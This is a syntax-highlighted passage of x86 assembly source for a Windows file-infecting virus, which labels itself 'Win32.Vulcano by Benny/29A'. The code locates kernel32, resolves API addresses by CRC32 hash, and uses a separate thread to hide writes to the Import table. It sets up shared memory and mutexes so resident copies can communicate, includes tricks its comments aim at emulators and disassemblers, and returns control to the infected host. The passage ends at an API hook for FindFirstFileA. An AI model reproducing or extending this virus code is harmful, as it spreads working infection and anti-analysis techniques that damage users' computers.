    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">77E00000h</span><span class="sc0">          </span><span class="sc1">;Win2k k32 image base</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_base</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">k32_found</span><span class="sc0">             </span><span class="sc1">;we got image base</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">77ED0000h</span><span class="sc0">          </span><span class="sc1">;Win2k k32 image base</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_base</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">k32_found</span><span class="sc0">             </span><span class="sc1">;we got image base</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFF70000h</span><span class="sc0">         </span><span class="sc1">;Win95/98 k32 image base</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_base</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">jmp_host</span><span class="sc0">                </span><span class="sc1">;base of k32 not found, quit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">k32_found</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;continue on another label</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">                    </span><span class="sc1">;fuck u emulator! :)</span><span class="sc0">

</span><span class="sc5">end_cc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">jmp_host</span><span class="sc0">                </span><span class="sc1">;and jump to host</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Win32.Vulcano by Benny/29A'</span><span class="sc0">    </span><span class="sc1">;little signature :)</span><span class="sc0">

</span><span class="sc5">k32_found</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get image base of app</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GMHA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get to PE header</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">crcAPIs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;start of CRC32 API table</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;get table of pointers</span><span class="sc0">
</span><span class="sc5">s_ET</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;get item</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">;is it 0?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_ET</span><span class="sc0">               </span><span class="sc1">;yeah, work is done</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;normalize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save EAX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SearchET</span><span class="sc0">               </span><span class="sc1">;search for API</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;save its address</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;was it 0?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;restore EAX</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">jmp_host</span><span class="sc0">             </span><span class="sc1">;yeah, error, quit</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">;correct pointers</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">;to pointers...</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">s_ET</span><span class="sc0">                </span><span class="sc1">;loop</span><span class="sc0">
</span><span class="sc5">get_base</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all registers</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">err_gbase</span><span class="sc4">&gt;</span><span class="sc0">     </span><span class="sc1">;setup SEH frame</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;set error value</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0"> </span><span class="sc1">;is it EXE?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">err_gbase</span><span class="sc0">               </span><span class="sc1">;no, quit</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;yeah, set flag</span><span class="sc0">
</span><span class="sc5">err_gbase</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;and quit</span><span class="sc0">
    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">;save flag</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit from procedure</span><span class="sc0">

</span><span class="sc5">end_ET</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;now we will create new</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;thread to hide writing to</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;Import table</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;delta offset</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NewThread</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;address of thread procedure</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;and other shit to stack</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddCreateThread</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;create thread!</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;is EAX=0?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">jmp_host</span><span class="sc0">             </span><span class="sc1">;yeah, quit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;parameter for CloseHandle</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">;infinite loop</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;handle of thread</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddWaitForSingleObject</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;wait for thread termination</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;close thread handle</span><span class="sc0">

</span><span class="sc1">;now we will create space in shared memory for VLCB structure</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@VLCB</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'VLCB'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;name of shared area</span><span class="sc0">
</span><span class="sc5">@VLCB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">              </span><span class="sc1">;size of area</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">;SWAP FILE!</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCreateFileMappingA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;open area</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">jmp_host</span><span class="sc0">             </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddMapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;map view of file to address</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">               </span><span class="sc1">;space of virus</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_gd1</span><span class="sc0">              </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vlcbBase</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">;save base address</span><span class="sc0">

    </span><span class="sc1">;now we will create named mutex</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@@1</span><span class="sc0">               </span><span class="sc1">;push address of name</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;random name</span><span class="sc0">
</span><span class="sc5">@@@1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">RDTCS</span><span class="sc0">                   </span><span class="sc1">;get random number</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;get address of name</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">              </span><span class="sc1">;terminate string with \0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;and save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;get address of generated name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ddCreateMutexA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;create mutex</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_gd2</span><span class="sc0">              </span><span class="sc1">;quit if error</span><span class="sc0">

</span><span class="sc1">;now we will initialize VLCB structure</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;EDX=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;get base of VLCB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.VLCB_Signature</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'BCLV'</span><span class="sc0">    </span><span class="sc1">;save signature</span><span class="sc0">

</span><span class="sc1">;now we will initialize record for thread</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">             </span><span class="sc1">;20 communication channels</span><span class="sc0">
</span><span class="sc5">sr_t</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.VLCB_TSep.VLCB_THandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;check handle</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">tnext</span><span class="sc0">               </span><span class="sc1">;if already reserved, then try next</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;get name of mutex</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.VLCB_TSep.VLCB_THandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">t_number</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">;and save ID number of mutex</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;create new thread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;for IPC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mThread</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;address of thread procedure</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCreateThread</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;create new thread</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_gd3</span><span class="sc0">               </span><span class="sc1">;quit if error</span><span class="sc0">

</span><span class="sc5">jmp_host</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">                        </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;save address of previous</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;API caller</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;restore all regs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">              </span><span class="sc1">;repair stack pointer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">;save selector</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save offset of API caller</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">                    </span><span class="sc1">;jump to host :)</span><span class="sc0">
</span><span class="sc5">tnext</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VLCB_TSize</span><span class="sc0">         </span><span class="sc1">;get to next record</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;increment counter</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">sr_t</span><span class="sc0">               </span><span class="sc1">;try again</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">jmp_host</span><span class="sc0">                </span><span class="sc1">;quit if more than 20 viruses r in memory</span><span class="sc0">
</span><span class="sc5">end_gd3</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;close mutex</span><span class="sc0">
</span><span class="sc5">end_gd2</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vlcbBase</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddUnmapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;unmap VLCB</span><span class="sc0">
</span><span class="sc5">end_gd1</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;close mapping of file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">jmp_host</span><span class="sc0">                </span><span class="sc1">;and jump to host</span><span class="sc0">


</span><span class="sc5">gtDelta</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgdlta</span><span class="sc0">             </span><span class="sc1">;procedure used to getting</span><span class="sc0">
</span><span class="sc5">mgdelta</span><span class="sc4">:</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;fuck u disassemblers</span><span class="sc0">
</span><span class="sc5">mgdlta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;get it</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">


</span><span class="sc5">newFindFirstFileA</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;hooker for FindFirstFileA API</span><span class="sc0">
